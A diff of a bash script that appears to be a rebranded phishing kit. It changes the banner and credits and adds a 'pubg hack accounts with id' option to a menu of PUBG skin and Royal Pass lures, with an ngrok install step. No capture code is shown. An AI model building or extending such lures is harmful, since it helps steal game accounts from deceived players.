@@ -57,14 +57,7 @@ ${ORANGE} ██║██████╔╝ ╚████╔╝ ██║   �
 ${ORANGE} ██║██╔══██╗  ╚██╔╝  ██║   ██║ ███╔╝  ██║   ██║
 ${ORANGE} ██║██║  ██║   ██║   ╚██████╔╝███████╗╚██████╔╝
 ${ORANGE} ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝ ╚═════╝
-${ORANGE}                                 
-${ORANGE}
-${ORANGE} 
-${ORANGE} 
-${ORANGE} 
-${ORANGE}
-${ORANGE}
-${ORANGE}                                  
+${ORANGE}                                                                
 ${ORANGE} ------ Co-founder, CEO of iran yousec -------●	                
 	EOF
 }
@@ -176,9 +169,7 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-${GREEN} Yousec 
-${GREEN} instagram 
-${RED} sslri
+${GREEN} Tiktok • .
 ${RED} Main Menu     
 ${RED} Exit
 	EOF
@@ -332,6 +323,7 @@ main_menu() {
 ${RED}[${WHITE}01${RED}] Pubg Gun Skin M416
 ${RED}[${WHITE}02${RED}] Pubg Royal Pass 17
 ${RED}[${WHITE}03${RED}] Pubg M416 Glacier
+${RED}[${WHITE}01${RED}] pubg hack accounts with id
 ${RED}[${WHITE}99${RED}]${ORANGE} About
 ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
@@ -356,7 +348,7 @@ ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 }
 
 ## Main
-SSLRI
+ahmad
 dependencies
 install_ngrok
 main_menu
